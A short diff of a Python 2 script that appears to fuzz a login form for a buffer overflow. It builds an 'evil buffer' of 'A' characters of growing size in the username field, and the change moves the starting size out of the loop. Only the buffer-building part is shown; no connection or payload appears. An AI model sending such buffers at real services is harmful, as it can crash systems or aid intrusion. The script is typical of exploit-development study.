@@ -3,13 +3,13 @@ import socket
 import time
 import sys
 
+size = 100
+
 
 while(size < 2000):
   try:
     print "\nSending evil buffer with %s bytes" % size
-    
-    size = 100
-    
+     
     inputBuffer = "A" * size
     
     content = "username=" + inputBuffer + "&password=A"
